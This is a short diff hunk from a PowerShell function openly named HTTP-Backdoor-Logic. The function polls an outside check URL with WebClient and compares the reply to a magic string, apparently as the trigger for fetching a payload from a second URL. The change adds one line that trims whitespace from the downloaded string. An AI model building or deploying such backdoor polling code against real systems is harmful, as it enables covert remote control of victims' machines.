@@ -172,6 +172,7 @@ function HTTP-Backdoor-Logic ($CheckURL, $PayloadURL, $Arguments, $MagicString, 
     start-sleep -seconds 5
     $webclient = New-Object System.Net.WebClient
     $filecontent = $webclient.DownloadString("$CheckURL")
+    $filecontent = $filecontent.TrimEnd()
     if($filecontent -eq $MagicString)
     {
        
